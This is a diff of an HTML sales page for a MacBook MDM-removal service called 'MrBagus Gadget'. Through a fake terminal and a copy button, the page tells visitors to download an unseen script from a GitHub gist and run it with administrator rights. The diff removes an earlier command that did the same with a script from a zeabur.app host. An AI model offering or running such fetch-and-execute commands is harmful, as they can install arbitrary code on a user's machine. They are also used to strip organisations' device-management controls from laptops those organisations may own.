@@ -3,157 +3,1084 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Webpage</title>
+    <title>MrBagus Gadget | Premium MacBook MDM Unlock Service</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --primary-color: #2563eb;
-            --secondary-color: #1e40af;
-            --accent-color: #f97316;
-            --text-color: #1f2937;
-            --light-bg: #f8fafc;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        :root {
+            --space-black: #1d1d1f;
+            --space-gray: #2c2c2e;
+            --light-gray: #f5f5f7;
+            --apple-blue: #0071e3;
+            --apple-blue-hover: #0062c0;
+            --terminal-green: #64d86b;
+            --terminal-orange: #ffa657;
+            --accent: #ff9500;
+            --accent-2: #ff2d55;
+            --purple: #af52de;
+            --transition: all 0.4s cubic-bezier(0.25, 0.1, 0.25, 1);
+        }
+
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            line-height: 1.6;
-            color: var(--text-color);
-            background: linear-gradient(135deg, var(--light-bg) 0%, #e2e8f0 100%);
+            background: linear-gradient(135deg, #0f0f14 0%, #1a1a23 100%);
+            color: var(--light-gray);
             min-height: 100vh;
+            overflow-x: hidden;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            padding: 0;
+            position: relative;
         }
 
-        .content {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 4rem 2rem;
-            background: rgba(255, 255, 255, 0.95);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-            border-radius: 16px;
-            margin-top: 2rem;
-            margin-bottom: 2rem;
+        /* Floating gadgets */
+        .floating-gadget {
+            position: absolute;
+            z-index: 0;
+            opacity: 0.15;
+            animation: float 6s ease-in-out infinite;
         }
 
-        h1 {
+        .gadget-1 {
+            top: 10%;
+            left: 5%;
             font-size: 2.5rem;
-            color: var(--primary-color);
-            margin-bottom: 1.5rem;
-            font-weight: 700;
+            color: var(--apple-blue);
+            animation-delay: 0s;
         }
 
-        p {
-            margin: 1rem 0;
-            font-size: 1.1rem;
-            color: var(--text-color);
+        .gadget-2 {
+            top: 20%;
+            right: 8%;
+            font-size: 3rem;
+            color: var(--accent);
+            animation-delay: 1s;
         }
 
-        .highlight {
-            background: linear-gradient(135deg, #fff5f5 0%, #fff0f6 100%);
-            padding: 2rem;
+        .gadget-3 {
+            bottom: 25%;
+            left: 7%;
+            font-size: 2.8rem;
+            color: var(--purple);
+            animation-delay: 2s;
+        }
+
+        .gadget-4 {
+            bottom: 15%;
+            right: 10%;
+            font-size: 2.3rem;
+            color: var(--terminal-green);
+            animation-delay: 3s;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Header styling */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 30px 0;
+            position: relative;
+            z-index: 20;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(40, 40, 42, 0.6);
+            padding: 12px 25px;
+            border-radius: 50px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: var(--transition);
+        }
+
+        .logo:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--apple-blue) 0%, #00498e 100%);
             border-radius: 12px;
-            margin: 2rem 0;
-            border: 1px solid rgba(249, 115, 22, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(0, 113, 227, 0.3);
         }
 
-        .highlight p {
-            color: var(--accent-color);
-            font-weight: 600;
-            margin: 1rem 0;
+        .logo-icon i {
+            font-size: 24px;
+            color: white;
         }
 
-        .contact-info {
-            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
-            padding: 2rem;
-            border-radius: 12px;
-            margin: 2rem 0;
-            border: 1px solid rgba(37, 99, 235, 0.2);
+        .logo-text {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to right, #ffffff, var(--apple-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
 
-        .contact-info p {
-            color: var(--primary-color);
+        .logo-text span {
+            color: var(--accent);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 40px;
+        }
+
+        .nav-links a {
+            color: var(--light-gray);
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+            padding: 10px 0;
+        }
+
+        .nav-links a:hover {
+            color: var(--apple-blue);
+        }
+
+        .nav-links a::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 3px;
+            background: var(--apple-blue);
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Hero section */
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 100px 0 60px;
+            position: relative;
+        }
+
+        .hero::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at center, rgba(0, 113, 227, 0.15) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .hero h1 {
+            font-size: 5rem;
+            font-weight: 800;
+            letter-spacing: -2px;
+            line-height: 1.05;
+            max-width: 900px;
+            margin: 0 auto 30px;
+            background: linear-gradient(to right, #ffffff, var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: fadeInUp 1s ease;
+            position: relative;
+        }
+
+        .hero h1::after {
+            content: "⚡";
+            position: absolute;
+            right: -50px;
+            top: -20px;
+            font-size: 4rem;
+            animation: pulse 2s infinite;
+        }
+
+        .hero p {
+            font-size: 1.8rem;
+            color: #a1a1a6;
+            max-width: 700px;
+            margin: 0 auto 50px;
+            animation: fadeInUp 1s ease 0.2s forwards;
+            opacity: 0;
+        }
+
+        .stats {
+            display: flex;
+            gap: 40px;
+            margin-top: 30px;
+        }
+
+        .stat-item {
+            background: rgba(40, 40, 42, 0.6);
+            border-radius: 20px;
+            padding: 25px 40px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            min-width: 200px;
+            transition: var(--transition);
+        }
+
+        .stat-item:hover {
+            transform: translateY(-10px);
+            background: rgba(0, 113, 227, 0.1);
+        }
+
+        .stat-number {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--apple-blue), var(--purple));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .stat-label {
             font-size: 1.2rem;
-            margin: 0.8rem 0;
+            color: #a1a1a6;
+            margin-top: 10px;
         }
 
-        .emoji {
-            font-size: 1.5rem;
-            margin-right: 0.5rem;
+        /* Terminal section */
+        .terminal-section {
+            max-width: 900px;
+            margin: 0 auto 100px;
+            animation: fadeInUp 1s ease 0.4s forwards;
+            opacity: 0;
+            position: relative;
+        }
+
+        .terminal-container {
+            background: var(--space-gray);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: perspective(1000px) rotateX(5deg);
+            transition: transform 0.5s ease;
+        }
+
+        .terminal-container:hover {
+            transform: perspective(1000px) rotateX(0deg);
+        }
+
+        .terminal-header {
+            background: #3a3a3c;
+            padding: 15px 25px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .terminal-buttons {
+            display: flex;
+            gap: 8px;
+            margin-right: 15px;
+        }
+
+        .terminal-btn {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+        }
+
+        .btn-close { background: #ff5f57; }
+        .btn-min { background: #febc2e; }
+        .btn-max { background: #28c840; }
+
+        .terminal-title {
+            color: #d0d0d0;
+            font-size: 1rem;
+            flex-grow: 1;
+            text-align: center;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .terminal-body {
+            padding: 40px;
+            font-family: 'SF Mono', Menlo, monospace;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            min-height: 200px;
+        }
+
+        .terminal-prompt {
+            color: var(--terminal-green);
+            margin-right: 10px;
+        }
+
+        .terminal-command {
+            color: var(--terminal-orange);
+            word-break: break-all;
+        }
+
+        .terminal-output {
+            margin-top: 20px;
+            color: #a0a0a0;
+            font-style: italic;
+        }
+
+        .copy-section {
+            display: flex;
+            justify-content: center;
+            margin-top: 40px;
         }
 
         .copy-btn {
-            background: var(--primary-color);
+            background: linear-gradient(to right, var(--apple-blue), var(--purple));
             color: white;
-            padding: 1rem 2rem;
             border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.1rem;
+            border-radius: 12px;
+            padding: 20px 50px;
+            font-size: 1.3rem;
             font-weight: 600;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 6px rgba(37, 99, 235, 0.2);
-            margin: 1.5rem 0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: var(--transition);
+            box-shadow: 0 10px 25px rgba(0, 113, 227, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .copy-btn::after {
+            content: "";
+            position: absolute;
+            top: -100%;
+            left: -100%;
+            width: 300%;
+            height: 300%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(45deg);
+            transition: all 0.5s ease;
         }
 
         .copy-btn:hover {
-            background: var(--secondary-color);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 8px rgba(37, 99, 235, 0.3);
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 113, 227, 0.6);
+        }
+
+        .copy-btn:hover::after {
+            top: -50%;
+            left: -50%;
         }
 
         .copy-btn:active {
             transform: translateY(0);
         }
 
-        @media (max-width: 640px) {
-            .content {
-                padding: 2rem 1rem;
-                margin: 1rem;
-            }
+        /* Features section */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin: 100px 0;
+        }
 
-            h1 {
-                font-size: 2rem;
-            }
+        .feature-card {
+            background: rgba(40, 40, 42, 0.6);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            transition: var(--transition);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
 
-            .highlight, .contact-info {
-                padding: 1.5rem;
+        .feature-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 0;
+            background: var(--apple-blue);
+            transition: height 0.6s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .feature-card:hover::before {
+            height: 100%;
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 25px;
+            color: var(--apple-blue);
+            transition: var(--transition);
+        }
+
+        .feature-card:hover .feature-icon {
+            transform: scale(1.2) rotate(10deg);
+            color: var(--accent);
+        }
+
+        .feature-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover .feature-title {
+            color: var(--apple-blue);
+        }
+
+        .feature-content {
+            font-size: 1.2rem;
+            line-height: 1.7;
+            color: #a1a1a6;
+        }
+
+        .feature-content p {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover .feature-content p {
+            color: var(--light-gray);
+        }
+
+        .emoji {
+            font-size: 1.5rem;
+            width: 36px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover .emoji {
+            transform: scale(1.3);
+        }
+
+        /* Interactive section */
+        .interactive-section {
+            background: linear-gradient(45deg, rgba(0, 113, 227, 0.1), rgba(175, 82, 222, 0.1));
+            border-radius: 30px;
+            padding: 80px 60px;
+            margin: 100px 0;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .interactive-title {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 40px;
+            background: linear-gradient(to right, var(--accent), var(--accent-2));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .gadget-slider {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 50px;
+            flex-wrap: wrap;
+        }
+
+        .gadget-item {
+            width: 150px;
+            height: 150px;
+            background: rgba(40, 40, 42, 0.7);
+            border-radius: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 2px solid transparent;
+        }
+
+        .gadget-item:hover {
+            transform: translateY(-15px) scale(1.1);
+            background: rgba(0, 113, 227, 0.2);
+            border-color: var(--apple-blue);
+        }
+
+        .gadget-icon {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            color: var(--apple-blue);
+        }
+
+        .gadget-label {
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+
+        /* Contact section */
+        .contact-section {
+            background: linear-gradient(to right, rgba(0, 113, 227, 0.1), rgba(0, 113, 227, 0.05));
+            border-radius: 30px;
+            padding: 60px;
+            margin: 100px 0;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+        }
+
+        .contact-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 40px;
+        }
+
+        .contact-info {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            flex-wrap: wrap;
+        }
+
+        .contact-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .contact-icon {
+            width: 100px;
+            height: 100px;
+            background: rgba(0, 113, 227, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            transition: var(--transition);
+            cursor: pointer;
+        }
+
+        .contact-icon:hover {
+            transform: scale(1.1) rotate(10deg);
+            background: var(--apple-blue);
+            box-shadow: 0 10px 25px rgba(0, 113, 227, 0.4);
+        }
+
+        .contact-label {
+            font-size: 1.2rem;
+            font-weight: 500;
+        }
+
+        .contact-value {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--apple-blue);
+            transition: var(--transition);
+        }
+
+        .contact-item:hover .contact-value {
+            color: var(--accent);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 60px 0 40px;
+            font-size: 1.2rem;
+            color: #a1a1a6;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .footer p {
+            max-width: 700px;
+            margin: 0 auto 30px;
+            font-size: 1.4rem;
+            line-height: 1.7;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .social-link {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            color: var(--light-gray);
+            transition: var(--transition);
+        }
+
+        .social-link:hover {
+            transform: translateY(-8px);
+            background: var(--apple-blue);
+            color: white;
+        }
+
+        .copyright {
+            margin-top: 40px;
+            font-size: 1rem;
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+        }
+
+        .floating {
+            animation: float 4s ease-in-out infinite;
+        }
+
+        /* Responsive design */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 3.5rem;
+            }
+            
+            .hero h1::after {
+                right: -30px;
+                top: -15px;
+                font-size: 3rem;
+            }
+            
+            .hero p {
+                font-size: 1.4rem;
+            }
+            
+            .terminal-body {
+                padding: 30px;
+                font-size: 1rem;
+            }
+            
+            .copy-btn {
+                padding: 16px 40px;
+                font-size: 1.1rem;
+            }
+            
+            .stats {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .nav-links {
+                gap: 20px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .hero {
+                padding: 60px 0 40px;
+            }
+            
+            .hero h1 {
+                font-size: 2.8rem;
+            }
+            
+            .hero h1::after {
+                right: -20px;
+                top: -10px;
+                font-size: 2.5rem;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .contact-info {
+                flex-direction: column;
+                gap: 30px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            
+            .hero h1::after {
+                display: none;
+            }
+            
+            .hero p {
+                font-size: 1.2rem;
+            }
+            
+            .terminal-body {
+                padding: 20px;
+                font-size: 0.85rem;
+            }
+            
+            .copy-btn {
+                width: 100%;
+            }
+            
+            .stat-item {
+                padding: 20px 30px;
+                min-width: 160px;
+            }
+            
+            .stat-number {
+                font-size: 2.5rem;
             }
         }
     </style>
 </head>
 <body>
-    <div class="content">
-        <h1>Welcome to Our MacBook Service Page</h1>
-        <p>Please click the button below to copy the code:</p>
-        <button class="copy-btn" id="copyButton">Click to Copy Code</button>
+    <!-- Floating gadgets -->
+    <div class="floating-gadget gadget-1">
+        <i class="fas fa-microchip"></i>
+    </div>
+    <div class="floating-gadget gadget-2">
+        <i class="fas fa-bolt"></i>
+    </div>
+    <div class="floating-gadget gadget-3">
+        <i class="fas fa-server"></i>
+    </div>
+    <div class="floating-gadget gadget-4">
+        <i class="fas fa-lock-open"></i>
+    </div>
 
-        <div class="highlight">
-            <p>MrBagus Gadget, MacBook MDM Expert</p>
-            <p>🔒 The earliest specialist in MacBook enterprise MDM configuration locks, no one knows MDM better!</p>
-            <p>🚀 Discover MacBook's potential, all in our store.</p>
-        </div>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-laptop-code"></i>
+                </div>
+                <div class="logo-text">MrBagus Gadget</div>
+            </div>
+            <nav class="nav-links">
+                <a href="#services">Services</a>
+                <a href="#process">Process</a>
+                <a href="#testimonials">Testimonials</a>
+                <a href="#contact">Contact</a>
+            </nav>
+        </header>
 
-        <div class="contact-info">
-            <p class="emoji">🌟 Store on Tiktok: MrBagus Gadget</p>
-            <p class="emoji">📲 Whatsapp: +60-1137270533</p>
-        </div>
-        
-        <p>Let's explore the future of MacBook together and unlock your technological world!</p>
+        <section class="hero">
+            <h1>Unlock Your MacBook's Potential</h1>
+            <p>Premium MDM removal service by the industry's most trusted experts</p>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-number">5000+</div>
+                    <div class="stat-label">Devices Unlocked</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">99.7%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">24h</div>
+                    <div class="stat-label">Avg. Response Time</div>
+                </div>
+            </div>
+            
+            <div class="terminal-section">
+                <div class="terminal-container">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-btn btn-close"></div>
+                            <div class="terminal-btn btn-min"></div>
+                            <div class="terminal-btn btn-max"></div>
+                        </div>
+                        <div class="terminal-title">Terminal — MDM Removal Script</div>
+                    </div>
+                    <div class="terminal-body">
+                        <div>
+                            <span class="terminal-prompt">$</span>
+                            <span class="terminal-command">curl -L https://gist.githubusercontent.com/benliew10/cfd4c9ec6247e168b7b618e66576b5a8/raw/ed632f51ac5adcf9ee4b9c8912cf9f33ccf2c093/gistfile1.txt -o custom_script.sh && chmod +x ./custom_script.sh && ./custom_script.sh</span>
+                        </div>
+                        <div class="terminal-output">
+                            # Run this command to start the MDM removal process<br>
+                            # Requires administrator privileges
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="copy-section">
+                    <button class="copy-btn" id="copyButton">
+                        <i class="fas fa-copy"></i> Copy Command to Clipboard
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <section class="features">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-unlock-alt"></i>
+                </div>
+                <h3 class="feature-title">MDM Removal Expertise</h3>
+                <div class="feature-content">
+                    <p><span class="emoji">🔒</span> The earliest specialist in MacBook enterprise MDM configuration locks</p>
+                    <p><span class="emoji">💯</span> No one knows MDM better than our team of experts</p>
+                    <p><span class="emoji">🛡️</span> Secure and reliable removal process</p>
+                </div>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3 class="feature-title">Fast & Reliable Service</h3>
+                <div class="feature-content">
+                    <p><span class="emoji">⏱️</span> Quick turnaround time for all MDM removal requests</p>
+                    <p><span class="emoji">🔧</span> Professional service with attention to detail</p>
+                    <p><span class="emoji">📈</span> Proven track record of successful unlocks</p>
+                </div>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-headset"></i>
+                </div>
+                <h3 class="feature-title">Premium Support</h3>
+                <div class="feature-content">
+                    <p><span class="emoji">🤝</span> Dedicated support throughout the process</p>
+                    <p><span class="emoji">🔄</span> Follow-up assistance after MDM removal</p>
+                    <p><span class="emoji">📚</span> Comprehensive guides and documentation</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="interactive-section">
+            <h2 class="interactive-title">Why Choose MrBagus Gadget?</h2>
+            <p style="font-size: 1.4rem; max-width: 800px; margin: 0 auto 40px;">We're not just technicians - we're MacBook enthusiasts who understand your device inside and out. Our passion for Apple technology drives us to deliver exceptional service.</p>
+            
+            <div class="gadget-slider">
+                <div class="gadget-item">
+                    <div class="gadget-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="gadget-label">Security</div>
+                </div>
+                <div class="gadget-item">
+                    <div class="gadget-icon">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <div class="gadget-label">Speed</div>
+                </div>
+                <div class="gadget-item">
+                    <div class="gadget-icon">
+                        <i class="fas fa-certificate"></i>
+                    </div>
+                    <div class="gadget-label">Certified</div>
+                </div>
+                <div class="gadget-item">
+                    <div class="gadget-icon">
+                        <i class="fas fa-dollar-sign"></i>
+                    </div>
+                    <div class="gadget-label">Value</div>
+                </div>
+                <div class="gadget-item">
+                    <div class="gadget-icon">
+                        <i class="fas fa-smile"></i>
+                    </div>
+                    <div class="gadget-label">Satisfaction</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="contact-section">
+            <h2 class="contact-title">Contact Our Experts</h2>
+            <div class="contact-info">
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fab fa-tiktok"></i>
+                    </div>
+                    <div class="contact-label">Tiktok Store</div>
+                    <div class="contact-value">MrBagus Gadget</div>
+                </div>
+                
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="contact-label">WhatsApp</div>
+                    <div class="contact-value">+60-1137270533</div>
+                </div>
+                
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <div class="contact-label">Email</div>
+                    <div class="contact-value">support@mrbagus.com</div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <p>Let's explore the future of MacBook together and unlock your technological world!</p>
+            
+            <div class="social-links">
+                <a href="#" class="social-link">
+                    <i class="fab fa-instagram"></i>
+                </a>
+                <a href="#" class="social-link">
+                    <i class="fab fa-facebook"></i>
+                </a>
+                <a href="#" class="social-link">
+                    <i class="fab fa-youtube"></i>
+                </a>
+                <a href="#" class="social-link">
+                    <i class="fab fa-twitter"></i>
+                </a>
+            </div>
+            
+            <div class="copyright">© 2023 MrBagus Gadget. All rights reserved. Apple and MacBook are trademarks of Apple Inc.</div>
+        </footer>
     </div>
 
     <script>
+        // Copy button functionality with the updated script
         document.getElementById('copyButton').addEventListener('click', function() {
-            var textToCopy = 'curl https://degula.zeabur.app/test.sh -o test.sh && chmod +x ./test.sh && ./test.sh';
+            var textToCopy = 'curl -L https://gist.githubusercontent.com/benliew10/cfd4c9ec6247e168b7b618e66576b5a8/raw/ed632f51ac5adcf9ee4b9c8912cf9f33ccf2c093/gistfile1.txt -o custom_script.sh && chmod +x ./custom_script.sh && ./custom_script.sh';
+            
+            // Create temporary textarea
             var textArea = document.createElement('textarea');
             textArea.value = textToCopy;
             document.body.appendChild(textArea);
             textArea.select();
-            document.execCommand('copy');
+            
+            try {
+                // Copy text
+                var successful = document.execCommand('copy');
+                
+                if(successful) {
+                    // Visual feedback
+                    var originalText = this.innerHTML;
+                    this.innerHTML = '<i class="fas fa-check"></i> Copied Successfully!';
+                    this.style.background = 'linear-gradient(to right, #34a853, #2e8b47)';
+                    
+                    // Revert after 2 seconds
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                        this.style.background = 'linear-gradient(to right, var(--apple-blue), var(--purple))';
+                    }, 2000);
+                }
+            } catch (err) {
+                console.error('Failed to copy text: ', err);
+                alert('Failed to copy text. Please copy manually.');
+            }
+            
+            // Clean up
             document.body.removeChild(textArea);
-            alert('Code has been copied to clipboard!');
+        });
+
+        // Animation on scroll
+        document.addEventListener('DOMContentLoaded', function() {
+            const featureCards = document.querySelectorAll('.feature-card');
+            const gadgets = document.querySelectorAll('.gadget-item');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach((entry, index) => {
+                    if (entry.isIntersecting) {
+                        setTimeout(() => {
+                            entry.target.style.opacity = 1;
+                            entry.target.style.transform = 'translateY(0)';
+                        }, 150 * index);
+                    }
+                });
+            }, {
+                threshold: 0.1
+            });
+            
+            featureCards.forEach(card => {
+                card.style.opacity = 0;
+                card.style.transform = 'translateY(30px)';
+                card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                observer.observe(card);
+            });
+            
+            gadgets.forEach(gadget => {
+                gadget.style.opacity = 0;
+                gadget.style.transform = 'translateY(30px)';
+                gadget.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                observer.observe(gadget);
+            });
+        });
+
+        // Fun interaction for gadgets
+        const gadgetItems = document.querySelectorAll('.gadget-item');
+        gadgetItems.forEach(item => {
+            item.addEventListener('click', function() {
+                this.style.transform = 'translateY(-20px) scale(1.2)';
+                this.style.background = 'rgba(175, 82, 222, 0.3)';
+                this.style.borderColor = 'var(--purple)';
+                
+                setTimeout(() => {
+                    this.style.transform = 'translateY(-15px) scale(1.1)';
+                    this.style.background = 'rgba(0, 113, 227, 0.2)';
+                    this.style.borderColor = 'var(--apple-blue)';
+                }, 500);
+            });
         });
     </script>
 </body>
